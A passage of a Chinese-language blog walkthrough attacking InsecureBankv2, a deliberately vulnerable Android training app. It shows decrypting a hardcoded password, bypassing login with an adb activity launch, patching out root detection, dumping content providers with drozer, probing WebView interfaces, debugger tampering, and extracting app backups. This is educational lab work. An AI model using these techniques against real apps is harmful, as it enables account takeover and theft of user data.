function</span></span><br><span class="line">String key = <span class="string">&quot;This is the super secret key 123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    The initialization vector used by the encryption function</span></span><br><span class="line"><span class="keyword">byte</span>[] ivBytes = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line">String plainText;</span><br><span class="line"><span class="keyword">byte</span>[] cipherData;</span><br><span class="line">String base64Text;</span><br><span class="line">String cipherText;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The function that handles the aes256 decryption.</span></span><br><span class="line"><span class="comment">ivBytes: Initialization vector used by the decryption function</span></span><br><span class="line"><span class="comment">keyBytes: Key used as input by the decryption function</span></span><br><span class="line"><span class="comment">textBytes: Ciphertext input to the decryption function</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] aes256decrypt(<span class="keyword">byte</span>[] ivBytes, <span class="keyword">byte</span>[] keyBytes, <span class="keyword">byte</span>[] textBytes)</span><br><span class="line"><span class="keyword">throws</span> UnsupportedEncodingException,</span><br><span class="line">NoSuchAlgorithmException,</span><br><span class="line">NoSuchPaddingException,</span><br><span class="line">InvalidKeyException,</span><br><span class="line">InvalidAlgorithmParameterException,</span><br><span class="line">IllegalBlockSizeException,</span><br><span class="line">BadPaddingException &#123;</span><br><span class="line"></span><br><span class="line">    AlgorithmParameterSpec ivSpec = <span class="keyword">new</span> IvParameterSpec(ivBytes);</span><br><span class="line">    SecretKeySpec newKey = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, newKey, ivSpec);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(textBytes);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">aesDeccryptedString</span><span class="params">(String theString)</span> <span class="keyword">throws</span> UnsupportedEncodingException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException </span>&#123;</span><br><span class="line">    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    cipherData = aes256decrypt(ivBytes, keyBytes, Base64.decode(theString.getBytes(<span class="string">&quot;UTF-8&quot;</span>), Base64.DEFAULT));</span><br><span class="line">    plainText = <span class="keyword">new</span> String(cipherData, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> plainText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    </span><br><span class="line">    String password = <span class="string">&quot;ecwTx6F9cmLbqyD+1yfKjA==&quot;</span>;</span><br><span class="line">    String decryptedPassword;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        </span><br><span class="line">        decryptedPassword = aesDeccryptedString(password);</span><br><span class="line">        System.out.println(decryptedPassword);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchPaddingException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidAlgorithmParameterException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (BadPaddingException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把里面的解密函数提取出来就可以了。</p>
+<h1 id="0x05-Vulnerable-Activity-Components"><a href="#0x05-Vulnerable-Activity-Components" class="headerlink" title="0x05 Vulnerable Activity Components"></a>0x05 Vulnerable Activity Components</h1><p>搜集具体哪些activity</p>
+<p>run app.activity.info -a com.android.insecurebankv2</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/10.png" alt="10.png" title="10.png"></p>
+<p>使用adb shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin</span><br></pre></td></tr></table></figure>
+
+<p>就可以绕过登陆了。</p>
+<h1 id="0x06-Root-Detection-and-Bypass"><a href="#0x06-Root-Detection-and-Bypass" class="headerlink" title="0x06 Root Detection and Bypass"></a>0x06 Root Detection and Bypass</h1><p>调用了showRootStatus 跟进一下</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/11.png" alt="11.png" title="11.png"></p>
+<p>这里看到了判断root的条件</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/12.png" alt="12.png" title="12.png"></p>
+<p>在：cond_2 这里显示Device not Rooted!!</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/13.png" alt="13.png" title="13.png"></p>
+<p>那么使用goto语句跳转到condd_2</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/14.png" alt="14.png" title="14.png"></p>
+<p>成功截图</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/15.png" alt="15.png" title="15.png"></p>
+<h1 id="0x07-Insecure-Content-Provider-access"><a href="#0x07-Insecure-Content-Provider-access" class="headerlink" title="0x07 Insecure Content Provider access"></a>0x07 Insecure Content Provider access</h1><p>搜集具体哪些provider</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.android.insecurebankv2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/16.png" alt="16.png" title="16.png"></p>
+<p>发现url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.finduri com.android.insecurebankv2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/17.png" alt="17.png" title="17.png"></p>
+<p>这些链接的格式如下</p>
+<p>content://包名.数据库/表名</p>
+<p>查看trackerusers表里面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers</span><br></pre></td></tr></table></figure>
+
+<p>使用drozer查看登陆过的账户</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/18.png" alt="18.png" title="18.png"></p>
+<h1 id="0x08-Insecure-Webview-implementation-Insecure-SDCard-storage"><a href="#0x08-Insecure-Webview-implementation-Insecure-SDCard-storage" class="headerlink" title="0x08 Insecure Webview implementation + Insecure SDCard storage"></a>0x08 Insecure Webview implementation + Insecure SDCard storage</h1><p>在 DoLogin.java 文件中</p>
+<p>下面的代码是写入sdcard卡中。</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/19.png" alt="19.png" title="19.png"></p>
+<p>然后把Statements_jack.html 取回到电脑中进行修改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /mnt/sdcard/Statements_jack.html Statements_jack</span><br></pre></td></tr></table></figure>
+
+<p>修改成如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;http://c.cnzz.com/core.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>) </span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">window</span>[obj].getClass();</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="javascript">                &#125;   </span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">check();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push Statements_jack /mnt/sdcard/Statements_jack.html</span><br></pre></td></tr></table></figure>
+
+<p>结果如下<br><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/20.png" alt="20.png" title="20.png"></p>
+<h1 id="0x09-Insecure-Logging-mechanism"><a href="#0x09-Insecure-Logging-mechanism" class="headerlink" title="0x09 Insecure Logging mechanism"></a>0x09 Insecure Logging mechanism</h1><p>在logcat中添加 com.android.insecurebankv2 过滤器。</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/21.png" alt="21.png" title="21.png"></p>
+<p>结果在logcat看到敏感消息</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/22.png" alt="22.png" title="22.png"></p>
+<h1 id="0x10-Android-Pasteboard-vulnerability"><a href="#0x10-Android-Pasteboard-vulnerability" class="headerlink" title="0x10 Android Pasteboard vulnerability"></a>0x10 Android Pasteboard vulnerability</h1><p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/23.png" alt="23.png" title="23.png"><br>字典存储在了<br>/data/data/com.android.providers.userdictionary/databases/user_dict.db</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/24.png" alt="24.png" title="24.png"></p>
+<h1 id="0x11-Application-Debuggable-Application-Debuggable"><a href="#0x11-Application-Debuggable-Application-Debuggable" class="headerlink" title="0x11 Application Debuggable+Application Debuggable"></a>0x11 Application Debuggable+Application Debuggable</h1><p>进入ddms查看com.android.insecurebankv2 id</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/25.png" alt="25.png" title="25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 jdwp:1082</span><br><span class="line">jdb -connect &quot;com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/26.png" alt="26.png" title="26.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classes</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/27.png" alt="27.png" title="27.png"><br><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/28.png" alt="28.png" title="28.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methods com.android.insecurebankv2.LoginActivity</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/29.png" alt="29.png" title="29.png"></p>
+<p>点击一下create User按钮</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/30.png" alt="30.png" title="30.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Step</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/31.png" alt="31.png" title="31.png"></p>
+<p>Locals 查看下本地变量</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/32.png" alt="32.png" title="32.png"></p>
+<p>更改text里面的内容</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/33.png" alt="33.png" title="33.png"></p>
+<p>再执行以下run命令</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/34.png" alt="34.png" title="34.png"></p>
+<p>结果如下<br><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/35.png" alt="35.png" title="35.png"></p>
+<h1 id="0x12-Android-keyboard-cache-issues"><a href="#0x12-Android-keyboard-cache-issues" class="headerlink" title="0x12 Android keyboard cache issues"></a>0x12 Android keyboard cache issues</h1><p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/36.png" alt="36.png" title="36.png"><br>把输入添加到剪切板中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps | grep insecure</span><br><span class="line">su u0_a48</span><br><span class="line">service call clipboard 2 s16 com.android.insecurebankv2</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/37.png" alt="37.png" title="37.png"></p>
+<h1 id="0x13-Developer-Backdoors"><a href="#0x13-Developer-Backdoors" class="headerlink" title="0x13 Developer Backdoors"></a>0x13 Developer Backdoors</h1><p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/38.png" alt="38.png" title="38.png"></p>
+<p>根据后门用户名是devadmin就是后门。</p>
+<h1 id="0x14-Insecure-HTTP-connections-Parameter-Manipulation"><a href="#0x14-Insecure-HTTP-connections-Parameter-Manipulation" class="headerlink" title="0x14 Insecure HTTP connections+Parameter Manipulation"></a>0x14 Insecure HTTP connections+Parameter Manipulation</h1><p>手机模拟器的设置。<br><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/39.png" alt="39.png" title="39.png"><br>Bupsuite的设置</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/40.png" alt="40.png" title="40.png"></p>
+<h1 id="0x15-Weak-change-password-implementation"><a href="#0x15-Weak-change-password-implementation" class="headerlink" title="0x15 Weak change password implementation"></a>0x15 Weak change password implementation</h1><p>只要拦截修改密码的数据包，然后修改username就可以修改任意账号的密码。</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/41.png" alt="41.png" title="41.png"></p>
+<h1 id="0x16-Username-Enumeration-issue"><a href="#0x16-Username-Enumeration-issue" class="headerlink" title="0x16 Username Enumeration issue"></a>0x16 Username Enumeration issue</h1><p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/42.png" alt="42.png" title="42.png"></p>
+<p>发送intruder模块中，设置username为变量进行爆破。</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/43.png" alt="43.png" title="43.png"><br>枚举jack这个用户名。</p>
+<h1 id="0x17-Android-Backup-vulnerability"><a href="#0x17-Android-Backup-vulnerability" class="headerlink" title="0x17 Android Backup vulnerability"></a>0x17 Android Backup vulnerability</h1><p>使用下面的命令进行备份</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup -f backup.ab com.android.insecurebankv2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/44.png" alt="44.png" title="44.png"></p>
+<p>Back up my data</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/45.png" alt="45.png" title="45.png"></p>
+<p>从这里下载 <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/adbextractor/">https://sourceforge.net/projects/adbextractor/</a> android-backup-extractor 解压 android-backup-extractor。</p>
+<p>在当前目录下生成 backup.ab 复制到 android-backup-extractor 目录下。</p>
+<p>java -jar abe.jar unpack backup.ab backup.zip</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/46.png" alt="46.png" title="46.png"></p>
+<p>打开backup.zip<br><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/47.png" alt="47.png" title="47.png"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lufe1.cn/2017/10/11/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/" title="insecurebankv2之演练" target="_blank" rel="external">https://lufe1.cn/2017/10/11/insecurebankv2之演练/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/lufeirider" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lufeirider" target="_blank"><span class="text-dark">lufei</span><small class="ml-1x">网络安全</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2017/10/17/Chrome%E6%8F%92%E4%BB%B6User-Agent%20Switcher%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8A%E9%83%A8%E5%88%86/" title="Chrome插件User-Agent Switcher恶意代码分析上部分"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2017/09/24/chrome%E6%8F%92%E4%BB%B6ProxySwitch/" title="chrome插件ProxySwitch"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2021 lufei@湘ICP备17016147号-1
+        
+        <div class="publishby">
+        	
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
